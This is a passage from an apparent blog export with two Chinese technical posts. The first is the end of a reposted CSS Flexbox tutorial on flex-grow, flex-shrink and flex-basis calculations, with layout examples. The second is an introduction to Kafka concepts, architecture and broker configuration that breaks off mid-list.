  flex-basis ：Flex 项目未扩展或收缩之前，它的大小，即指定了 Flex 项目在主轴方向的初始大小

flex 属性可以指定 1个值（单值语法） 、 2个值（双值语法）  或 3个值（三值语法） 。
单值语法：值必须为以下其中之一：

  一个无单位的数（ &lt;number&gt; ），比如 flex: 1 ，这个时候它会被当作 &lt;flex-grow&gt; 的值
  一个有效的宽度（ width ）值，比如 flex: 30vw ，这个时候它会被当作 &lt;flex-basis&gt; 的值
  关键词 none 、 auto 或 initial （即初始值）

双值语法：第一个值必须为一个无单位数值，并且它会被当作 &lt;flex-grow&gt; 的值；第二个值必须为以下之一：

  一个无单位的数（ &lt;number&gt; ），它会被当作 &lt;flex-shrink&gt; 的值
  一个有效的宽度（ width ）值，它会被当作 &lt;flex-basis&gt; 的值

三值语法：

  第一个值必须是一个无单位数（ &lt;number&gt; ），并且它会被当作 &lt;flex-grow&gt; 的值
  第二个值必须是一个无单位数（ &lt;number&gt; ），并且它会被当作 &lt;flex-shrink&gt; 的值
  第三个值必须为一个有效的宽度（ width ）值，并且它会被当作 &lt;flex-basis&gt; 的值

flex 属性的取值可以是：

  auto ：Flex 项目会根据自身的 width 和 height 来确定尺寸，但 Flex 项目根据 Flex 容器剩余空间进行伸缩。其相当于 flex: 1 1 auto 
  initial ：Flex 项目会根据自身的 width 和 height 来设置尺寸。它会缩短自身以适应 Flex 容器，但不会伸长并吸收 Flex 容器中的额外剩余空间来适应 Flex 容器。其相当于 flex: 0 1 auto 
  none ：Flex 项目会根据自身的 width 和 height 来设置尺寸。它是完全非弹性的（既不会缩短，也不会伸长来适应 Flex 容器）。其相当于 flex: 0 0 auto 
  &lt;flex-grow&gt; ：定义 Flex 项目的 flex-grow 属性，取值为 &lt;number&gt; 
  &lt;flex-shrink&gt; ：定义 Flex 项目的 flex-shrink 属性，取值为 &lt;number&gt; 
  &lt;flex-basis&gt; ：定义 Flex 项目的 flex-basis 属性。若值为 0 ，则必须加上单位，以免被视作伸缩性

flex-grow 计算flex-grow 计算公式：

示例：
假设 Flex 容器中有四个 Flex 项目，具体参数：

  Flex 容器的宽度是 80vw 
  Flex 容器中共有四个 Flex 项目，并且每个 Flex 项目的宽度是 10vw 
  Flex 项目宽度总和为 10vw x 4 = 40vw 
  Flex 容器的剩余空间为 80vw - 40vw = 40vw 
  Flex 项目的 flex-grow 的值分别是 0 、 1 、 2 和 3 ，所有 Flex 项目的 flex-grow 总和为 0 + 1 + 2 + 3 = 6 

flex-grow&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-grow 值01230 + 1 + 2+ 3 = 6Flex 项目宽度10vw10vw10vw10vw10vw x 4 = 40vwFlex 容器宽度80vwFlex 容器剩余空间80vw - 40vw = 40vwFlex 项目新宽度????

计算过程：

计算出来的结果：
flex-grow&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-grow 值01230 + 1 + 2+ 3 = 6Flex 项目宽度10vw10vw10vw10vw10vw x 4 = 40vwFlex 容器宽度80vwFlex 容器剩余空间80vw - 40vw = 40vwFlex 项目新宽度10vw16.667vw23.333vw30vw

flex-grow 的取值还可以是 小数值 。如果将上面示例中的 flex-grow 的值分别换成 0 、 0.1 、 0.2 和 0.3 ，这个时候 flex-grow 的总和（所有 Flex 项目的 flex-grow 和）就是 0.6  ，该值小于 1 。这个时候，Flex 项目同样会根据 flex-grow 增长因子来瓜分 Flex 容器的剩余空间，Flex 自身宽度也会变大，但 Flex 容器的剩余空间不会被全部瓜分完，因为所有 flex-grow 和小于 1 。就该示例下，只瓜分了 Flex 容器剩余空间宽度的 60% 。
如果 flex-grow 和小于 1 , 其计算公式如下：

flex-grow&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-grow 值0.1.2.30 + 1 + 2+ 3 = .6Flex 项目宽度10vw10vw10vw10vw10vw x 4 = 40vwFlex 容器宽度80vwFlex 容器剩余空间80vw - 40vw = 40vwFlex 项目新宽度10vw14vw18vw22vw

即使 Flex 容器中所有 Flex 项目的 flex-grow 和大于 1 ，但也不可以绝对地说，Flex 项目可以根据自身的 flex-grow 所占比率来瓜分 Flex 容器的剩余空间。因为元素的尺寸会受 max-width 的影响。当 Flex 项目显式设置了 max-width的值时，当 Flex 项目根据flex-grow计算出来的宽度大于 max-width时，Flex 项目会按 max-width的值为准。比如我们在前面的示例上，给所有 Flex 项目设置一个 max-width 的值为 18vw ，此时计算过程和结果如下：
flex-grow&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-grow 值01230 + 1 + 2+ 3 = 6Flex 项目宽度10vw10vw10vw10vw10vw x 4 = 40vwFlex 容器宽度80vwFlex 容器剩余空间80vw - 40vw = 40vwFlex 项目计算出的新宽度10vw16.667vw23.333vw30vwFlex 项目设置最大宽度18vw18vw18vw18vwFlex 项目最终宽度10vw16.667vw18vw18vw

这个时候 Flex 容器剩余空间并没有全部用完， 40vw - 0vw - 6.667vw - 8vw - 8vw = 17.333vw ，即 Flex 容器还有 17.333vw 的剩余空间。
如果 Flex 项目没有显式设置与宽度有关的属性（包括 flex-basis ），那么 flex-grow 在计算时，Flex 项目会按其内容的宽度来计算。

从上图可以得到：

  Flex 容器的宽度是 804px 
  Flex 项目的宽度分别是 43.36px 、 92.09px 、 140.83px 和 189.56px ，所有 Flex 项目宽度的总和为 465.84px 
  Flex 容器的剩余宽度为 804px - 465.84px = 338.16px 
  所有 Flex 项目的 flex-grow 值为 1 ，即 所有 Flex 项目的 flex-grow 总和为 4 

将相应的值套用到 flex-grow 的公式中，可以得到：
flex-grow&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-grow 值11111 x 4 = 4Flex 项目宽度43.36px92.09px148.83px189.56px465.84pxFlex 容器宽度804pxFlex 容器剩余空间338.16pxFlex 项目新宽度127.9px176.63px225.37px274.1px


注意，不同的浏览器对小数处理有差异。

flex-shrink 计算flex-shrink 计算公式：

示例：
假设 Flex 容器有四个 Flex 项目，具体参数如下：

  Flex 容器的宽度是 40vw 
  Flex 容器中共有四个 Flex 项目，并且每个 Flex 项目的宽度都是 15vw 
  Flex 项目宽度总和为 15vw x 4 = 60vw 
  Flex 容器的不足空间为 40vw - 60vw = -20vw 
  Flex 项目的 flex-shrink 的值分别是 0 、 1 、 2 和 3 ，所有 Flex 项目的 flex-shrink 总和为 0 + 1 + 2 + 3 = 6 

flex-shrink&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-shrink 值01230 + 1 + 2+ 3 = 6Flex 项目宽度15vw15vw15vw15vw15vw x 4 = 60vwFlex 容器宽度40vwFlex 容器不足空间60vw - 40vw = 20vwFlex 项目新宽度？？？？

计算过程：

计算出来的结果：
flex-shrink&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-shrink 值01230 + 1 + 2+ 3 = 6Flex 项目宽度15vw15vw15vw15vw15vw x 4 = 60vwFlex 容器宽度40vwFlex 容器不足空间60vw - 40vw = 20vwFlex 项目收缩比例00.16670.3330.5Flex 项目新宽度15vw11.67vw8.33vw5vw

flex-shrink 的计算还可以甚至另一个公式来计算：

flex-shrink 和 flex-grow 类似，也可以取小数值。如果 Flex 容器中所有 Flex 项目的 flex-shrink 总和小于 1 ，那么 Flex 容器的不足空间就不会被 Flex 项目按收缩因子瓜分完，Flex 项目会依旧会溢出 Flex 容器。
flex-shrink 总和小于 1 时，其计算公式如下：

基于上面的示例，把 Flex 项目的 flex-shrink 分别设置为 0 、 0.1 、 0.2 和 0.3 ，计算过程如下：
flex-shrink&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-shrink 值00.10.20.30.6Flex 项目宽度15vw15vw15vw15vw15vw x 4 = 60vwFlex 容器宽度40vwFlex 容器不足空间60vw - 40vw = 20vwFlex 项目新宽度15vw13vw11vw9vw

即使 Flex 容器中所有 Flex 项目的 flex-shrink 和大于 1 ，但也不可以绝对地说，Flex 项目可以根据自身的 flex-shrink 所占比率来瓜分 Flex 容器的不足空间。因为元素的尺寸会受 min-width 的影响。当 Flex 项目显式设置了 min-width的值时，当 Flex 项目根据 flex-shrink计算出来的宽度小于 min-width时，Flex 项目会按 min-width的值为准。比如我们在前面的示例上，给所有 Flex 项目设置一个 min-width 的值为 10vw ，此时计算过程和结果如下：
flex-shrink&nbsp;公式中变量名称Flex1Flex2Flex3Flex4总数Flex 项目的 flex-shrink 值01230 + 1 + 2+ 3 = 6Flex 项目宽度15vw15vw15vw15vw15vw x 4 = 60vwFlex 容器宽度40vwFlex 容器不足空间60vw - 40vw = 20vwFlex 项目收缩比例00.16670.3330.5Flex 项目设置最小宽度10vw10vw10vw10vwFlex 项目计算出的新宽度15vw11.67vw8.33vw5vwFlex 项目最终宽度15vw11.67vw10vw10vw

在这个情况之下，Flex 项目的最终宽度总和还是会大于 Flex 容器宽度，Flex 项目同样会溢出 Flex 容器。
flex-shrink 和 flex-grow 还有一点相似，那就是未显式给 Flex 容器的 Flex 项目显式设置与宽度有关的属性时，那么 Flex 项目的初始宽度会以其内容的宽度作为基准计算值。
flex-shrink 有一点和 flex-grow 完全不同，如果某个 Flex 项目按照 flex-shrink 计算出来的新宽度趋向于 0 时，Flex 项目将会按照该元素的 min-content 的大小来设置宽度，同时这个宽度将会转嫁到其他 Flex 项目，再按相应的收缩因子进行收缩。
比如我们将第四个 Flex 项目的 flex-shrink 的值从 3 改为 9 。根据上面提供的公式，可以获知，Flex 项目 4 的新宽度等于 15vw - (20vw ÷ 12) × 9 = 0 
计算出来的宽度为 0 ，但实际上这个时候渲染出来的宽度是该项目的 min-content (该示例就是 “shrink” 单词的宽度，如下图所示)，大约 47.95px （约 3.66vw ）。那么这个值将会分成 3 份（因为该例另外三个 Flex 项目的 flex-shrink 是 0 、 1 和 2 ），并且对应的 Flex 项目会继续分配本应 Flex 项目 4 要收缩的宽度。即：

  Flex 项目 1 新宽度等于 15vw - 20 ÷ 12 × 0 - 3.66 ÷ 3 × 0 = 15vw  (约 196.5px )
  Flex 项目 2 新宽度等于 15vw - 20 ÷ 12 × 1 - 3.66 ÷ 3 × 1 = 12.113vw  (约 158.6847px )
  Flex 项目 3 新宽度等于 15vw - 20 ÷ 12 × 2 - 3.66 ÷ 3 × 2 = 9.227vw  (约 120.869px )

浏览器视窗宽度在 1310px 状态下渲染出来的结果如下：

在 Flexbox 布局模块中，基于前面提到的 Flex 容器的对齐属性、Flex 项目中的 flex-shrink 和 flex-grow 我们就可以很好的处理 Flex 容器的剩余空间和不足空间：

  Flex 容器有剩余空间（所有 Flex 项目的宽度总和小于 Flex 容器的宽度），如果设置了 flex-grow ，Flex 项目会根据扩展因子分配 Flex 容器剩余空间；在未设置 flex-grow 时，在 Flex 容器中是否设置了对齐方式，如果是，那么会按对齐方式分配 Flex 容器剩余空间，如果不是，Flex 容器剩余空间不变
  Flex 容器有不足空间（所有 Flex 项目的宽度总和大于 Flex 容器的宽度），如果设置了 flex-shrink 值为 0 ，Flex 项目不会收缩，Flex 项目溢出 Flex 容器；如果未显式设置 flex-shrink 值，Flex 项目分平均分配 Flex 容器不足空间，Flex 项目会变窄（Flex 项目的 flex-shrink 的默认值为 1 ），如果显式设置了 flex-shrink 的值为非 0 的不同值，那么 Flex 项目会按照不同的收缩因子分配 Flex 容器不足空间，Flex 项目同样会变窄

具体的我们可以绘制一张这方面的流程图：

flex-basis 计算flex-basis 的计算相对于 flex-grow 和 flex-shrink 更略为复杂，因为它和 Flex 项目的 内容（Content） 、** width 、 min-width 和 max-width 都有关系。这里的关系指的就是它们之间的权重关系，简单地说，在 Flex 项目中同时出现这几个属性时，最终由谁来决定 Flex 项目的宽度**。
在 Flexbox 布局中，可以使用 flex-basis 来实始化 Flex 项目尺寸，即 在任何 Flex 容器空间（剩余空间或不足空间）分配发生之前初始化 Flex 项目尺寸。
事实上，在 Flexbox 布局模块中 设置 Flex 项目的尺寸大小存在一个隐式的公式：

content  ➜ width  ➜ flex-basis

简单地说，如果 Flex 项目未显式指定 flex-basis 的值，那么 flex-basis 将回退到 width （或 inline-size ）属性；如果未显式指定 width （或 inline-size ）属性的值，那么 flex-basis 将回退到基于 Flex 项目内容计算宽度。不过，决定 Flex 项目尺寸大小，还受 flex-grow 和 flex-shrink 以及 Flex 容器大小的影响。而且 Flex 项目 最终尺寸 会受 min-width、 max-width(或 min-inline-size 、 max-inline-size ) 属性限制。这一点必须得注意。
来看一个示例：
&lt;div class&#x3D;&quot;flex__container&quot;&gt;
    &lt;div class&#x3D;&quot;flex__item&quot;&gt;&lt;&#x2F;div&gt;
    &lt;div class&#x3D;&quot;flex__item&quot;&gt;&lt;&#x2F;div&gt;
    &lt;div class&#x3D;&quot;flex__item&quot;&gt;&lt;&#x2F;div&gt;
    &lt;div class&#x3D;&quot;flex__item&quot;&gt;&lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;

.flex__container &#123;
    width: 600px;
    display: flex;

    border: 1px dashed #f36;
    align-items: stretch;
&#125;

Flex 项目不显式的设置任何与尺寸大小有关系属性，即用 content来撑开 Flex 项目。
&lt;div class&#x3D;&quot;flex__container&quot;&gt;
    &lt;div class&#x3D;&quot;flex__item&quot;&gt;Lorem ipsum dolor sit amet&lt;&#x2F;div&gt;
    &lt;div class&#x3D;&quot;flex__item&quot;&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit&lt;&#x2F;div&gt;
    &lt;div class&#x3D;&quot;flex__item&quot;&gt;Fugiat dolor nihil saepe. Nobis nihil minus similique hic quas mollitia.&lt;&#x2F;div&gt;
    &lt;div class&#x3D;&quot;flex__item&quot;&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit. Molestias consequuntur sequi suscipit iure fuga ea!&lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;

在这个示例中，并没有显式给 Flex 项目设置 flex-basis 属性，此时 flex-basis 会取默认值 auto ：

显式给 Flex 项目设置 width 值。
:root &#123; 
    --width: 120px; 
&#125; 

.flex__item &#123; 
    width: var(--width); 
&#125;

这个时候所有 Flex 项目宽度都是相等的：

浏览器计算出来的 flex-basis 值依旧为 auto ，但显式的设置了 width: 120px ，最终 width 属性的值决定了 Flex 项目的尺寸大小。
显式给 Flex 项目设置 flex-basis 值，即 Flex 项目同时有 width 和 flex-basis 值。
:root &#123;
    --width: 120px;
    --flexBasis: 150px;
&#125;

.flex__container &#123;
    width: 800px;
&#125;

.flex__item &#123;
    width: var(--width);
    flex-basis: var(--flexBasis);
&#125;

虽然在 Flex 项目同时显式设置了 width 和 flex-basis ，但 Flex 项目最终的尺寸大小采用了 flex-basis 的值：

在 Flexbox 布局模块中影响 Flex 项目尺寸大小应该根据其隐式公式 (即 content  ➜ width  ➜ flex-basis  ）来进行判断。如果要显式给 Flex 项目设置尺寸大小，其最佳方式是 使用 flex-basis ，而不是 width (或 inline-size )。
最后还有一点千万别忘记：
使用 flex-basis 时会受min-width和 max-width（或逻辑属性中min-inline-size或max-inline-size ）的限制。
在 CSS 中，如果元素同时出现 width 、 min-width 和 max-width 属性时，其权重计算遵循以下规则：

  元素的 width 大于 max-width 时，元素的 width 等于 max-width ，即 max-width 能覆盖 width （ max-width 胜出）
  元素的 width 小于 min-width 时，元素的 width 等于 min-width ，即 min-width 能覆盖 width （ min-width 胜出）
  当 min-width 大于 max-width 时， min-width 优先级将高于 max-width （ min-width 胜出）

如果 Flex 项目同时出现 width 、 flex-basis 和 min-width 时，具体的运算过程如下：

  根据法则： content  ➜ width  ➜ flex-basis ，判断出运用于 Flex 项目的值，即 flex-basis 会运用于 Flex 项目 ( flex-basis 胜出)
  再根据法则：Flex 项目的 width  小于 min-width 时，Flex 项目的 width  等于 min-width ，即 min-width 能覆盖 width （**min-width 胜出**）

这样一来，如果 flex-basis 小于 min-width 时，Flex 项目的宽度会取值 min-width ，即 min-width 覆盖 flex-basis （min-width胜出）。
如果 Flex 项目同时出现 width 、 flex-basis 和 max-width 时，具体的运算过程如下：

  根据法则： content  ➜ width  ➜ flex-basis ，判断出运用于 Flex 项目的值，即 flex-basis 会运用于 Flex 项目 ( flex-basis 胜出)
  再根据法则：Flex 项目的 width  大于 max-width 时，Flex 项目的 width  等于 max-width ，即 max-width 能覆盖 width （ max-width 胜出）

这样一来，如果 flex-basis 大于 max-width 时，Flex 项目的宽度会取值 max-width ，即 max-width 覆盖 flex-basis （ max-width 胜出）。
如果 Flex 项目同时出现 width 、 flex-basis 、 min-width 和 max-width 时，会在上面的规则上增加新的一条规则来进行判断：

**当 min-width  大于 max-width  时， min-width 优先级将高于 max-width ( min-width胜出)**。

那么套用到 Flex 项目中：

  flex-basis 大于 max-width ，Flex 项目的宽度等于 max-width ，即 max-width 能覆盖 flex-basis （ max-width 胜出）
  flex-basis 小于 min-width 时，Flex 项目的宽度会取值 min-width ，即 min-width 覆盖 flex-basis （ min-width 胜出 ）

由于 min-width 大于 max-width 时会取 min-width ，有了这个先取条件我们就可以将 flex-basis 和 min-width 做权重比较，即：** flex-basis 会取 min-width 。反过来，如果 min-width 小于 max-width 时则依旧会取 max-width ，同时要是 flex-basis 大于 max-width 就会取 max-width **。
如果你理解了的话，可以使用更简单的规则来决定用于 Flex 项目的尺寸。
首先根据 content  ➜ width  ➜ flex-basis 来决定用哪个来决定用于 Flex 项目。如果 Flex 项目显式设置了 flex-basis 属性，则会忽略 content 和 width 。而且 min-width 是用来设置 Flex 项目的下限值； max-width 是用来设置 Flex 项目的上限值。
用一个简单的流程图来描述：


注，Flex 项目上的 flex-shrink 和 flex-grow 也会影响 Flex 项目尺寸大小！

如果你想更深入的了解 Flexbox 中 Flex 项目的计算，建议你花点时间阅读：

  你真的了解 CSS 的 flex-basis 吗？
  聊聊 Flexbox 布局中的 flex 的演算法
  深入理解 flex 布局以及计算

Flex 项目上的 margin在 Flex 项目显式设置 margin 的值为 auto 可以灵活的控制单个 Flex 项目在 Flex 容器中的位置：

比如像下图这样的效果，使用 margin-left: auto 就非常的实用：

案例整理padding 与自动宽问题
针对这个案例, 较好的方案对于内部元素不显式设置任何关于 padding 和 margin 的属性。人工实现可能会像下面这样：
&lt;div class&#x3D;&quot;flex__container&quot;&gt;
    &lt;span class&#x3D;&quot;coupon&quot;&gt;卷&lt;&#x2F;span&gt;
    &lt;span class&#x3D;&quot;divider&quot;&gt;&lt;&#x2F;span&gt;
    &lt;span class&#x3D;&quot;price&quot;&gt;¥1000&lt;&#x2F;span&gt;
&lt;&#x2F;div&gt;

.flex__container &#123;
    display: inline-flex;
    min-width: 200px;
    height: 60px;

    border: 1px solid rgba(255, 0, 54, 1);
    background-color: rgba(255, 0, 54, 0.1);
    border-radius: 4px;
    color: #ff0036;
    font-size: 24px;
    font-weight: 400;
&#125;

.flex__container &gt; span &#123;
    display: inline-flex;
    justify-content: center;
    align-items: center;
&#125;

.divider &#123;
    border-right: 1px dashed currentColor;
&#125;

.coupon &#123;
    min-width: 50px;
&#125;

.price &#123;
    flex: 1;
    min-width: 0;
    padding: 0 10px;
&#125;



  ① 像类似 Button，Badge 等（外形看上去类似于内联块），设置 Flex 容器为 inline-flex ，并且给其设置一个 min-width （默认情况下等同于 Sketch 设计稿）和 一个 height 
  ② 从设计稿上分析可以得到，前面 “卷” 这个宽度是可知的，在该元素上设置一个固定宽度 width 
  ③ 一个约 1px 的分割线，可以使用 border 或者定死宽度 width 
  ④ 最右侧 “价格” 是下不可定因素，在 Flex 项目上，可以将其显式设置 flex: 1 ，让该部分占用 Flex 容器的剩余空间
  ⑤ 为了让 “价格” 更具有扩展性，当其数值扩展到 Flex 容器无剩余空间时，数字会紧挨 Flex 容器主轴终点和分割线，为了让视觉上更友好，要以在 “价格” 容器设置一个 padding-left 和 padding-right 

小结这篇笔记涉及到了 Flexbox 规范中的大部分内容以及一些临界点，在使用 Flexbox 来完成 UI 上的布局除了文章中提到的一些基础内容和细节之外，还有一些其他的东西。比如 Flex 容器中的定位，层级计算等，Flex 容器和 Flex 项目碰到overflow以及 Flex 容器中的滚动计算等。这些对于场景具有较强的指定性，对于边界的处理也过于复杂。在我们平常使用 Flexbox 很少甚至不怎么会碰到。因此没有在文章中罗列。
如果你在使用 Flexbox，特别是在使用 imgcook 自动还原 UI，效果和你预期不一样，或者有不合理的地方，都可以随时来撩偶。

转载于：https://www.w3cplus.com/css/unknown-details-of-the-flexbox-layout.html

]]></content>
      <tags>
        <tag>css</tag>
        <tag>flex</tag>
      </tags>
  </entry>
  <entry>
    <title>Kafka入门</title>
    <url>/2021/05/10/Kafka%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[初识 Kafka什么是 KafkaKafka 是由 Linkedin 公司开发的，它是一个分布式的，支持多分区、多副本，基于 Zookeeper 的分布式消息流平台，它同时也是一款开源的基于发布订阅模式的消息引擎系统。
Kafka 的基本术语消息：Kafka 中的数据单元被称为消息，也被称为记录，可以把它看作数据库表中某一行的记录。
批次：为了提高效率， 消息会分批次写入 Kafka，批次就代指的是一组消息。
主题：消息的种类称为 主题（Topic）, 可以说一个主题代表了一类消息。相当于是对消息进行分类。主题就像是数据库中的表。
分区：主题可以被分为若干个分区（partition），同一个主题中的分区可以不在一个机器上，有可能会部署在多个机器上，由此来实现 kafka 的伸缩性，单一主题中的分区有序，但是无法保证主题中所有的分区有序

生产者：向主题发布消息的客户端应用程序称为生产者（Producer），生产者用于持续不断的向某个主题发送消息。
消费者：订阅主题消息的客户端程序称为消费者（Consumer），消费者用于处理生产者产生的消息。
消费者群组：生产者与消费者的关系就如同餐厅中的厨师和顾客之间的关系一样，一个厨师对应多个顾客，也就是一个生产者对应多个消费者，消费者群组（Consumer Group）指的就是由一个或多个消费者组成的群体。

偏移量：偏移量（Consumer Offset）是一种元数据，它是一个不断递增的整数值，用来记录消费者发生重平衡时的位置，以便用来恢复数据。
broker: 一个独立的 Kafka 服务器就被称为 broker，broker 接收来自生产者的消息，为消息设置偏移量，并提交消息到磁盘保存。
broker集群：broker 是集群 的组成部分，broker 集群由一个或多个 broker 组成，每个集群都有一个 broker 同时充当了集群控制器的角色（自动从集群的活跃成员中选举出来）。
副本：Kafka 中消息的备份又叫做 副本（Replica），副本的数量是可以配置的，Kafka 定义了两类副本：领导者副本（Leader Replica） 和 追随者副本（Follower Replica），前者对外提供服务，后者只是被动跟随。
重平衡：Rebalance。消费者组内某个消费者实例挂掉后，其他消费者实例自动重新分配订阅主题分区的过程。Rebalance 是 Kafka 消费者端实现高可用的重要手段。


Kafka 的特性（设计原则）
高吞吐、低延迟：kakfa 最大的特点就是收发消息非常快，kafka 每秒可以处理几十万条消息，它的最低延迟只有几毫秒；
高伸缩性：每个主题 (topic) 包含多个分区(partition)，主题中的分区可以分布在不同的主机(broker) 中；
持久性、可靠性：Kafka 能够允许数据的持久化存储，消息被持久化到磁盘，并支持数据备份防止数据丢失，Kafka 底层的数据存储是基于 Zookeeper 存储的，Zookeeper 我们知道它的数据能够持久存储；
容错性：允许集群中的节点失败，某个节点宕机，Kafka 集群能够正常工作；
高并发：支持数千个客户端同时读写。

Kafka 的使用场景
活动跟踪：Kafka 可以用来跟踪用户行为，比如我们经常回去淘宝购物，你打开淘宝的那一刻，你的登陆信息，登陆次数都会作为消息传输到 Kafka ，当你浏览购物的时候，你的浏览信息，你的搜索指数，你的购物爱好都会作为一个个消息传递给 Kafka ，这样就可以生成报告，可以做智能推荐，购买喜好等；
传递消息：Kafka 另外一个基本用途是传递消息，应用程序向用户发送通知就是通过传递消息来实现的，这些应用组件可以生成消息，而不需要关心消息的格式，也不需要关心消息是如何发送的；
度量指标：Kafka 也经常用来记录运营监控数据。包括收集各种分布式应用的数据，生产各种操作的集中反馈，比如报警和报告；
日志记录：Kafka 的基本概念来源于提交日志，比如我们可以把数据库的更新发送到 Kafka 上，用来记录数据库的更新时间，通过 kafka 以统一接口服务的方式开放给各种 consumer，例如 hadoop、Hbase、Solr 等；
流式处理：流式处理是有一个能够提供多种应用程序的领域；
限流削峰：Kafka 多用于互联网领域某一时刻请求特别多的情况下，可以把请求写入 Kafka 中，避免直接请求后端程序导致服务崩溃。

Kafka 的消息队列Kafka 的消息队列一般分为两种模式：点对点模式和发布订阅模式
Kafka 是支持消费者群组的，也就是说 Kafka 中会有一个或者多个消费者，如果一个生产者生产的消息由一个消费者进行消费的话，那么这种模式就是点对点模式

点对点模式的消息队列
如果一个生产者或者多个生产者产生的消息能够被多个消费者同时消费的情况，这样的消息队列成为发布订阅模式的消息队列

发布 - 订阅模式的消息队列
Kafka 系统架构
如上图所示，一个典型的 Kafka 集群中包含若干 Producer（可以是 web 前端产生的 Page View，或者是服务器日志，系统 CPU、Memory 等），若干 broker（Kafka 支持水平扩展，一般 broker 数量越多，集群吞吐率越高），若干 Consumer Group，以及一个 Zookeeper 集群。Kafka 通过 Zookeeper 管理集群配置，选举 leader，以及在 Consumer Group 发生变化时进行 rebalance。Producer 使用 push 模式将消息发布到 broker，Consumer 使用 pull 模式从 broker 订阅并消费消息。
核心 APIKafka 有四个核心 API，它们分别是

Producer API，它允许应用程序向一个或多个 topics 上发送消息记录；
Consumer API，允许应用程序订阅一个或多个 topics 并处理为其生成的记录流；
Streams API，它允许应用程序作为流处理器，从一个或多个主题中消费输入流并为其生成输出流，有效的将输入流转换为输出流；
Connector API，它允许构建和运行将 Kafka 主题连接到现有应用程序或数据系统的可用生产者和消费者。例如，关系数据库的连接器可能会捕获对表的所有更改。


Kafka 为何如此之快Kafka 实现了零拷贝原理来快速移动数据，避免了内核之间的切换。Kafka 可以将数据记录分批发送，从生产者到文件系统（Kafka 主题日志）到消费者，可以端到端的查看这些批次的数据。
批处理能够进行更有效的数据压缩并减少 I/O 延迟，Kafka 采取顺序写入磁盘的方式，避免了随机磁盘寻址的浪费，更多关于磁盘寻址的了解，请参阅 程序员需要了解的硬核知识之磁盘 。
总结一下其实就是四个要点

顺序读写；
零拷贝；
消息压缩；
分批发送。

Kafka 安装和重要配置Kafka 安装我在 Kafka 系列第一篇应该比较详细了，详情见带你涨姿势的认识一下 kafka 这篇文章。
那我们还是主要来说一下 Kafka 中的重要参数配置吧，这些参数对 Kafka 来说是非常重要的。
broker 端配置
broker.id

每个 kafka broker 都有一个唯一的标识来表示，这个唯一的标识符即是 broker.id，它的默认值是 0。这个值在 kafka 集群中必须是唯一的，这个值可以任意设定，

port

如果使用配置样本来启动 kafka，它会监听 9092 端口。修改 port 配置参数可以把它设置成任意的端口。要注意，如果使用 1024 以下的端口，需要使用 root 权限启动 kakfa。

zookeeper.connect

用于保存 broker 元数据的 Zookeeper 地址是通过 zookeeper.connect 来指定的。比如我可以这么指定 localhost:2181 表示这个 Zookeeper 是运行在本地 2181 端口上的。我们也可以通过 比如我们可以通过 zk1:2181,zk2:2181,zk3:2181 来指定 zookeeper.connect 的多个参数值。该配置参数是用冒号分割的一组 hostname:port/path 列表，其含义如下
hostname 是 Zookeeper 服务器的机器名或者 ip 地址。
port 是 Zookeeper 客户端的端口号
/path 是可选择的 Zookeeper 路径，Kafka 路径是使用了 chroot 环境，如果不指定默认使用跟路径。

如果你有两套 Kafka 集群，假设分别叫它们 kafka1 和 kafka2，那么两套集群的 zookeeper.connect 参数可以这样指定：zk1:2181,zk2:2181,zk3:2181/kafka1 和 zk1:2181,zk2:2181,zk3:2181/kafka2


log.dirs

Kafka 把所有的消息都保存到磁盘上，存放这些日志片段的目录是通过 log.dirs 来制定的，它是用一组逗号来分割的本地系统路径，log.dirs 是没有默认值的，你必须手动指定他的默认值。其实还有一个参数是 log.dir，如你所知，这个配置是没有 s 的，默认情况下只用配置 log.dirs 就好了，比如你可以通过 /home/kafka1,/home/kafka2,/home/kafka3 这样来配置这个参数的值。

num.recovery.threads.per.data.dir

对于如下 3 种情况，Kafka 会使用可配置的线程池来处理日志片段。
服务器正常启动，用于打开每个分区的日志片段；
服务器崩溃后重启，用于检查和截断每个分区的日志片段；
服务器正常关闭，用于关闭日志片段。
默认情况下，每个日志目录只使用一个线程。因为这些线程只是在服务器启动和关闭时会用到，所以完全可以设置大量的线程来达到井行操作的目的。特别是对于包含大量分区的服务器来说，一旦发生崩愤，在进行恢复时使用井行操作可能会省下数小时的时间。设置此参数时需要注意，所配置的数字对应的是 log.dirs 指定的单个日志目录。也就是说，如果 num.recovery.threads.per.data.dir 被设为 8，并且 log.dir 指定了 3 个路径，那么总共需要 24 个线程。

auto.create.topics.enable

默认情况下，kafka 会使用三种方式来自动创建主题，下面是三种情况：
当一个生产者开始往主题写入消息时
当一个消费者开始从主题读取消息时
当任意一个客户端向主题发送元数据请求时
auto.create.topics.enable 参数我建议最好设置成 false，即不允许自动创建 Topic。在我们的线上环境里面有很多名字稀奇古怪的 Topic，我想大概都是因为该参数被设置成了 true 的缘故。
主题默认配置Kafka 为新创建的主题提供了很多默认配置参数，下面就来一起认识一下这些参数

num.partitions

num.partitions 参数指定了新创建的主题需要包含多少个分区。如果启用了主题自动创建功能（该功能是默认启用的），主题分区的个数就是该参数指定的值。该参数的默认值是 1。要注意，我们可以增加主题分区的个数，但不能减少分区的个数。

default.replication.factor

这个参数比较简单，它表示 kafka 保存消息的副本数，如果一个副本失效了，另一个还可以继续提供服务 default.replication.factor 的默认值为 1，这个参数在你启用了主题自动创建功能后有效。

log.retention.ms

Kafka 通常根据时间来决定数据可以保留多久。默认使用 log.retention.hours 参数来配置时间，默认是 168 个小时，也就是一周。除此之外，还有两个参数 log.retention.minutes 和 log.retentiion.ms 。这三个参数作用是一样的，都是决定消息多久以后被删除，推荐使用 log.retention.ms。

log.retention.bytes

